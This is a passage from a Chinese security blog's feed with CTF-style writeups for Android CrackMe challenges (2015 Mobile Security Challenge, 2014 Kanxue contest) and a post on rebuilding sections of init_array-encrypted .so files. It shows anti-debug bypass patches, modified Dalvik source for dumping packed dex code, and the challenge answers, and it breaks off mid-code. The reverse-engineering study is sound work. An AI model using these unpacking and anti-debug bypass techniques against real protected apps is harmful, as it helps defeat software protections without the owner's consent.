    <id>http://ele7enxxh.com/2015-Mobile-Security-Challenge-3.html</id>
    <published>2015-01-27T02:04:02.000Z</published>
    <updated>2016-03-23T06:25:19.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为2015年移动安全挑战赛第三题的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;http://msc.pediy.com/timu.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://msc.pediy.com/timu.htm&lt;/a&gt;&lt;br&gt;平台：Android&lt;br&gt;类型：CrackMe&lt;/p&gt;
&lt;p&gt;利用JEB反编译APK后发现只有一个继承Application类的StubApplication类，该类加载了动态库。很明显，dex加壳了，那么在SO里肯定回解壳的，不过SO有反调试和混淆，分析起来比较困难（好吧，至少我不想分析了）。&lt;br&gt;我注意到在lib/armeabi目录中的libmobisecy.so实际上是一个zip文件，解压后得到一个classes.dex文件，拖到JEB里：&lt;br&gt;&lt;img src=&quot;/images/2015-Mobile-Security-Challenge-3_1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;所有的函数实体都被替换成了throw new RuntimeException();注意到的是除了函数实体，其他地方都是正确的，用010的dex模板解析也没有报错，那么我们只需要将真正的函数实体恢复就可以了，也就是修复codeOff，修复codeOff对应的字节码。（对dex结构不熟悉的童鞋，面壁去吧）&lt;/p&gt;
&lt;p&gt;那么问题来了，怎么不通过调试SO就得到codeOff和其对应的字节码呢？O(∩_∩)O比忘了Android是开源的，直接修改源码，从底层那里搞出来！&lt;br&gt;还有一个问题，什么时候才知道该APK已经解壳了呢？这个就需要了解这种加壳方式的原理了:&lt;br&gt;戳这里：&lt;a href=&quot;http://blogs.360.cn/blog/proxydelegate-application/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blogs.360.cn/blog/proxydelegate-application/&lt;/a&gt;&lt;br&gt;再戳这里：&lt;a href=&quot;http://blog.csdn.net/androidsecurity/article/details/8809542&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/androidsecurity/article/details/8809542&lt;/a&gt;&lt;br&gt;通过上面两篇文章我们可以知道（你不知道我也没办法），最后必定是要通过调用Application.onCreate来启动真正的逻辑的。也就是说当执行Application.onCreate时，codeOff已经修正完毕。好了现在我们开始改源码，在dalvik/vm/interp/Stack.cpp文件的dvmCallMethodV函数（因为这个函数调用了onCreate函数，函数原型：void dvmCallMethodV(Thread&lt;em&gt; self, const Method&lt;/em&gt; method, Object&lt;em&gt; obj, bool fromJni, JValue&lt;/em&gt; pResult, va_list args)），添加自己的逻辑：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (&lt;span class=&quot;built_in&quot;&gt;strcmp&lt;/span&gt;(method-&amp;gt;name, &lt;span class=&quot;string&quot;&gt;&quot;onCreate&quot;&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ALOGD(&lt;span class=&quot;string&quot;&gt;&quot;dvmCallMethodV: methodName: %s\n&quot;&lt;/span&gt;, method-&amp;gt;name);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; Method* thisMethod = dvmGetCurrentJNIMethod();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	assert(thisMethod != &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ClassObject* mainClazz = dvmFindClassNoInit(dvmNameToDescriptor(&lt;span class=&quot;string&quot;&gt;&quot;crackme/a3/Main&quot;&lt;/span&gt;), thisMethod-&amp;gt;clazz-&amp;gt;classLoader);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ALOGD(&lt;span class=&quot;string&quot;&gt;&quot;className: %s&quot;&lt;/span&gt;, mainClazz-&amp;gt;descriptor);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; i;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    DvmDex *pDvmDex = mainClazz-&amp;gt;pDvmDex;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    DexFile *pDexFile = pDvmDex-&amp;gt;pDexFile;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)pDexFile-&amp;gt;pHeader-&amp;gt;classDefsSize; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; DexClassDef* pClassDef;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    &lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; u1* pEncodedData;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    DexClassData* pClassData;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	    &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pClassDef = dexGetClassDef(pDexFile, i);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pEncodedData = dexGetClassData(pDexFile, pClassDef);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pClassData = dexReadAndVerifyClassData(&amp;amp;pEncodedData, &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (pClassData == &lt;span class=&quot;literal&quot;&gt;NULL&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			ALOGE(&lt;span class=&quot;string&quot;&gt;&quot;Trouble reading class data\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; j;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)pClassData-&amp;gt;header.directMethodsSize; j++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			DexMethod *pDexDirectMethod = &amp;amp;pClassData-&amp;gt;directMethods[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			ALOGD(&lt;span class=&quot;string&quot;&gt;&quot;direct: classIdx: %x, methodIdx: %x, codeOff: %x&quot;&lt;/span&gt;, pClassDef-&amp;gt;classIdx, pDexDirectMethod-&amp;gt;methodIdx, pDexDirectMethod-&amp;gt;codeOff);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;)pClassData-&amp;gt;header.virtualMethodsSize; j++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			DexMethod *pDexVirtualMethod = &amp;amp;pClassData-&amp;gt;virtualMethods[j];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			ALOGD(&lt;span class=&quot;string&quot;&gt;&quot;virtual: classIdx: %x, methodIdx: %x, codeOff: %x&quot;&lt;/span&gt;, pClassDef-&amp;gt;classIdx, pDexVirtualMethod-&amp;gt;methodIdx, pDexVirtualMethod-&amp;gt;codeOff);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里面涉及到dalvik源码里的很多结构体，请自行研究。我这里只是打印出了codeOff，接下来dump和修复的工作就不再详述了，关键是思路！（ps：我的办法不是很优雅，应该有更好的思路）&lt;/p&gt;
&lt;p&gt;经过上一步骤，得到了修复过好的dex，原以为这样就结束了，结果又遇到一个问题，我们先看jeb反编译出的几个关键代码吧：&lt;br&gt;将输入作为map的key，得到对应的value：&lt;br&gt;&lt;img src=&quot;/images/2015-Mobile-Security-Challenge-3_2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;前两个字符的hashCode等于3618且字符ascii值和为168，这里推出前两个字符为s5：&lt;br&gt;&lt;img src=&quot;/images/2015-Mobile-Security-Challenge-3_3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;然后就是读取两个annotation，与后面几位比较，相同则验证成功：&lt;br&gt;&lt;img src=&quot;/images/2015-Mobile-Security-Challenge-3_4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;问题就出在最后这个验证，我们之前修复的是codeOff，但是没有修复annotationsOff，怎么办呢？还是改源码，直接让源码帮我们把两个annotation的值打印出来：&lt;br&gt;在dalvik/vm/reflect/Annotation.cpp的processAnnotationValue函数处添加自己的逻辑：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在函数头部打印出className：&lt;pre&gt;&lt;code&gt;ALOGD(&amp;quot;***processAnnotationValue*** className: %s&amp;quot;, clazz-&amp;gt;descriptor);
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;在case kDexAnnotationString处打印出值：&lt;pre&gt;&lt;code&gt;ALOGD(&amp;quot;elemObj: %s&amp;quot;, dvmCreateCstrFromString((const StringObject *)elemObj));
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;得到后面的字符为：7e1p&lt;br&gt;最终密码为：… _____ ____. . ..___ .__.&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2015年移动安全挑战赛第三题的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2015移动安全挑战赛-第2题</title>
    <link href="http://ele7enxxh.com/2015-Mobile-Security-Challenge-2.html"/>
    <id>http://ele7enxxh.com/2015-Mobile-Security-Challenge-2.html</id>
    <published>2015-01-27T01:34:02.000Z</published>
    <updated>2016-03-23T06:25:14.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为2015年移动安全挑战赛第二题的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;http://msc.pediy.com/timu.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://msc.pediy.com/timu.htm&lt;/a&gt;&lt;br&gt;平台：Android&lt;br&gt;类型：CrackMe&lt;/p&gt;
&lt;p&gt;Java层什么都没做，直接把输入传给了SO中的函数securityCheck进行处理，IDA attach后发现程序退出了，好吧，肯定是反调试了。这里顺便说一下检测调试的手段：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;读取了/proc/&lt;pid&gt;/status文件里面的状态和TracerId&lt;/pid&gt;&lt;/li&gt;
&lt;li&gt;调用ptrace(PTRACE_TRACEME,PTRACE_ATTACH)比如子进程attach父进程，子线程traceme自己等等&lt;/li&gt;
&lt;li&gt;其他奇淫技巧&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这道题是在JNI_OnLoad函数中进行了反调试，那么就需要在APK运行前进行调试，再次记录一下调试方法吧：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备好调试环境（IDA、adb等）&lt;/li&gt;
&lt;li&gt;adb shell&lt;/li&gt;
&lt;li&gt;am start -D -n com.yaotong.crackme/.MainActivity&lt;/li&gt;
&lt;li&gt;使用IDA附加上该APK进程，设置加载SO时端下来，在dlopen下断点（在这里下断可以调试INIT和INIT_ARRAY的函数）&lt;/li&gt;
&lt;li&gt;jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700&lt;/li&gt;
&lt;li&gt;使IDA continue&lt;/li&gt;
&lt;li&gt;此时IDA应该就会断下来，我们再在libcrackme.so的JNI_OnLoad下断点&lt;/li&gt;
&lt;li&gt;单步跟踪结合IDA静态分析和F5，并在fgets处下断点，SO是通过读取/proc/pid/status文件中的Tracepid字段来判断是否有调试，如果检测到调试程序将会退出。最终，我用patch跳转指令（IDA的Edit菜单里Patch program-&amp;gt;Change byte可以修改指令的机器码，可以改成0 0 0 0）掉了反调试：&lt;br&gt;&lt;img src=&quot;/images/2015-Mobile-Security-Challenge-2_1.png&quot; alt=&quot;1&quot;&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;过掉反调试接下来就easy了，在Java_com_yaotong_crackme_MainActivity_securityCheck下断点，让IDA continue，最终验证逻辑就是一个简单的字符串比较：&lt;br&gt;&lt;img src=&quot;/images/2015-Mobile-Security-Challenge-2_2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;最终密码为：aiyou,bucuoo&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2015年移动安全挑战赛第二题的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>2015移动安全挑战赛-第1题</title>
    <link href="http://ele7enxxh.com/2015-Mobile-Security-Challenge-1.html"/>
    <id>http://ele7enxxh.com/2015-Mobile-Security-Challenge-1.html</id>
    <published>2015-01-26T09:33:03.000Z</published>
    <updated>2016-03-23T06:25:07.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为2015年移动安全挑战赛第一题的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这次算是正式的参加了一次线上的比赛，所以还是记录下来。&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;http://msc.pediy.com/timu.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://msc.pediy.com/timu.htm&lt;/a&gt;&lt;br&gt;平台：Android&lt;br&gt;类型：CrackMe&lt;/p&gt;
&lt;p&gt;第一题非常简单，送分题。逻辑全部在Java层，还贴心的帮我们打了log，么么哒！&lt;br&gt;&lt;img src=&quot;/images/2015-Mobile-Security-Challenge-1_1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;table是映射表，pw是正确的映射结果，enPassword是我们输入数据的映射结果，当pw==enPassword时验证成功。&lt;br&gt;最终的密码为：581026&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为2015年移动安全挑战赛第一题的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>看雪-2014 APP应用攻防竞赛第二阶段第2题（攻击篇）解析</title>
    <link href="http://ele7enxxh.com/Pediy-2014-Second-Stage-Of-APP-Offensive-And-Defensive-Competition-Analysis-2.html"/>
    <id>http://ele7enxxh.com/Pediy-2014-Second-Stage-Of-APP-Offensive-And-Defensive-Competition-Analysis-2.html</id>
    <published>2014-12-19T07:55:00.000Z</published>
    <updated>2016-03-23T06:31:09.000Z</updated>
    
    <content type="html">&lt;p&gt;本文为看雪-2014 APP应用攻防竞赛第二阶段第2题（攻击篇）的writeup。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=193824&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=193824&lt;/a&gt;&lt;br&gt;平台：Android&lt;br&gt;类型：CrackMe&lt;/p&gt;
&lt;p&gt;我就简单记录下关于SO的脱壳部分，达到能使用IDA动态调试的目的，更多分析看这篇帖子吧：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?p=1328679。&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?p=1328679。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;直接把libcrackme.so拖到IDA，IDA直接挂掉了，拖到010里，用ELF解析脚本跑了下，段解析错误。于是readelf -l之：&lt;br&gt;&lt;img src=&quot;/images/Pediy-2014-Second-Stage-Of-APP-Offensive-And Defensive-competition-Analysis-2_1.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;奇怪的是，只有一个LOAD段，然后一个明显错误的NOTE段，基于NOTE段实际上不会被载入内存，所以直接将其全部清0：&lt;br&gt;&lt;img src=&quot;/images/Pediy-2014-Second-Stage-Of-APP-Offensive-And Defensive-competition-Analysis-2_2.png&quot; alt=&quot;2&quot;&gt;&lt;br&gt;然后再拖到IDA里，恩，这次没出错了，不过显然关键代码都被加密了：&lt;br&gt;&lt;img src=&quot;/images/Pediy-2014-Second-Stage-Of-APP-Offensive-And Defensive-competition-Analysis-2_3.png&quot; alt=&quot;3&quot;&gt;&lt;br&gt;恩，我用之前研究的SODUMP试了下，但是由于该SO的段表已经发生变化（只有一个LOAD）所以基于相对位置恢复出来的section都错了，不过应该还是基于INIT加壳的。那么还是用IDA将内存DUMP了下来，由于只有一个LOAD段，所以不用进行内存修正，拖到010结果elf头全为0，直接套用原来的头部，再把dynamic段的p_offset的修正一下，当然还得将NOTE段头全部清0，拖到IDA里，一片光明，至少可以静态分析了：&lt;br&gt;&lt;img src=&quot;/images/Pediy-2014-Second-Stage-Of-APP-Offensive-And Defensive-competition-Analysis-2_4.png&quot; alt=&quot;4&quot;&gt;&lt;br&gt;接着将原APK中的libcrackme.so替换为处理过后的SO，签名，运行，结果崩溃了。回想了SO加载过后的流程，搞清了为什么崩溃：&lt;br&gt;Android Linker将SO加载进内存后，首先会依次执行INIT段、INIT_ARRAY段中的函数，而对于libcrackme.so，INIT段、INIT_ARRAY段中的函数执行的功能是进行解密操作，但是我们dump出的SO已经完成了解密，此时再调用INIT段、INIT_ARRAY段中的函数，就发生了不可预期的情况，导致崩溃。&lt;br&gt;那么知道了原因，解决办法就是不再执行解密函数。&lt;br&gt;具体方法有很多：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;以DEBUG模式启动APP，在linker的CallConstructors函数处下断，然后直接修改函数流程，直接返回。&lt;/li&gt;
&lt;li&gt;以DEBUG模式启动APP，在soinfo_link_image函数处下断，通过case DT_INIT，case DT_INIT_ARRAY,获得SO中d-&amp;gt;d_tag的位置，直接修改其为任意未知类型。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;第一种需要每次调试都修改，第二种一劳永逸。这样终于可以用IDA动态调试。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文为看雪-2014 APP应用攻防竞赛第二阶段第2题（攻击篇）的writeup。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于init_array加密的SO的脱壳</title>
    <link href="http://ele7enxxh.com/Unpack-Android-Shared-Library-Based-On-Init_Array-Encryption.html"/>
    <id>http://ele7enxxh.com/Unpack-Android-Shared-Library-Based-On-Init_Array-Encryption.html</id>
    <published>2014-12-17T12:03:30.000Z</published>
    <updated>2016-03-23T06:31:21.000Z</updated>
    
    <content type="html">&lt;p&gt;看雪上已经有好几个帖子讲述了这方面的原理了，也已经现成的dump工具，不过都没有开源出来，秉着学习的态度自己研究了下，最终实现了基于init_array加密的SO的脱壳。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;具体的原理已经有人分享了出来：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ELF section修复的一些思考：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=192874&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=192874&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;从零打造简单的SODUMP工具：&lt;a href=&quot;http://bbs.pediy.com/showthread.php?t=194053&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://bbs.pediy.com/showthread.php?t=194053&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我这里给出每个节区addr，offset，size的详细计算方法：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;SHN_UNDEF：全部是0，没什么好说的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;.dynsym，.hash，.rel.dyn，.rel.plt，.ARM.exidx，.fini_array，.init_array这几个节区直接通过soinfo结构体就能直接恢复：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.dynsym：addr = offset = si-&amp;gt;symtab - si-&amp;gt;base; size = si-&amp;gt;nchain * 16;&lt;/li&gt;
&lt;li&gt;.hash：addr = offset = hash_shdr(注1); size = (2 + si-&amp;gt;nbucket + si-&amp;gt;nchain) * 4;&lt;/li&gt;
&lt;li&gt;.rel.dyn：addr = offset = si-&amp;gt;rel - si-&amp;gt;base; size = si-&amp;gt;rel_count * sizeof(Elf32_Rel);&lt;/li&gt;
&lt;li&gt;.rel.plt：addr = offset = si-&amp;gt;plt_rel - si-&amp;gt;base; size = si-&amp;gt;plt_rel_count * sizeof(Elf32_Rel);&lt;/li&gt;
&lt;li&gt;.ARM.exidx：addr = offset = si-&amp;gt;ARM_exidx - si-&amp;gt;base; size = si-&amp;gt;ARM_exidx_count * 8;&lt;/li&gt;
&lt;li&gt;.fini_array：addr = si-&amp;gt;fini_array - si-&amp;gt;base; offset = si-&amp;gt;fini_array - si-&amp;gt;base - 0x1000; size = si-&amp;gt;fini_array_count * sizeof(Elf32_Addr);&lt;/li&gt;
&lt;li&gt;.init_array：addr = si-&amp;gt;init_array - si-&amp;gt;base; offset = si-&amp;gt;init_array - si-&amp;gt;base - 0x1000; size = si-&amp;gt;init_array_count * sizeof(Elf32_Addr);&lt;/li&gt;
&lt;li&gt;.dynamic：addr = si-&amp;gt;dynamic - si-&amp;gt;base; offset = si-&amp;gt;dynamic - si-&amp;gt;base - 0x1000; size = dynamic_count * sizeof(Elf32_Dyn);&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;.dynstr，.hash，.dynamic：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Elf32_Word strsz = 0;
Elf32_Addr hash_shdr = 0;
size_t dynamic_count = 0;
for (Elf32_Dyn* d = si-&amp;gt;dynamic; d-&amp;gt;d_tag != DT_NULL; ++d) {
    switch (d-&amp;gt;d_tag) {
    case DT_STRSZ:
        strsz = d-&amp;gt;d_un.d_val;
        break;
    case DT_HASH:
        hash_shdr = d-&amp;gt;d_un.d_ptr;
        break;
    }
    dynamic_count++;
}
dynamic_count++;
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;.dynstr：addr = offset = si-&amp;gt;strtab - si-&amp;gt;base; size = strsz;&lt;/li&gt;
&lt;li&gt;.hash：addr = offset = hash_shdr; size = (2 + si-&amp;gt;nbucket + si-&amp;gt;nchain) * 4;&lt;/li&gt;
&lt;li&gt;.dynamic：addr = si-&amp;gt;dynamic - si-&amp;gt;base; offset = si-&amp;gt;dynamic - si-&amp;gt;base - 0x1000; size = dynamic_count * sizeof(Elf32_Dyn);&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;.plt，通过遍历plt头部的固定十六个字节确定起始位置：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unsigned int plt_start[] = {0xe52de004, 0xe59fe004, 0xe08fe00e, 0xe5bef008 };
Elf32_Addr plt_shdr = 0;
for (int i = 0; i &amp;lt; dump_size - 16; i++) {
    if (memcmp(dump_correct_so + i, plt_start, 16) == 0) {
        plt_shdr = i;
        break;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;其中dump_size为dump且内存修正过后的SO的大小（实际上就是第二个load段的vaddr加上filesz的值），dump_correct_so为dump且内存修正后的SO的指针。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.plt：addr = offset = plt_shdr; size = 20 + 12 * si-&amp;gt;plt_rel_count;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;.got&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;int type = 0;
int flag = 0;
Elf32_Addr got_addr = 0;
Elf32_Word gotsz = 0;
Elf32_Word global_offset_table = (Elf32_Word)si-&amp;gt;plt_got - (Elf32_Word)si-&amp;gt;base;
for (Elf32_Rel* rel = si-&amp;gt;rel; (Elf32_Addr)rel &amp;lt; (Elf32_Addr)si-&amp;gt;rel + si-&amp;gt;rel_count * sizeof(Elf32_Rel); rel++) {
    if (rel-&amp;gt;r_offset == global_offset_table - 4) {
        type = 1;
        break;
    }
}
if (type == 1) {
    for(Elf32_Word global_offset = global_offset_table - 4; global_offset &amp;gt; 0; global_offset -= 4) {
        flag = 0;
        for (Elf32_Rel* rel = si-&amp;gt;rel; (Elf32_Addr)rel &amp;lt; (Elf32_Addr)si-&amp;gt;rel + si-&amp;gt;rel_count * sizeof(Elf32_Rel); rel++) {
            if (rel-&amp;gt;r_offset == global_offset) {
                got_addr = global_offset;
                flag = 1;
                break;
            }
        }
        if(flag == 0) {
            break;
        }
    }
    gotsz = global_offset_table + 8 + si-&amp;gt;plt_rel_count * 4 + 4 - got_addr;
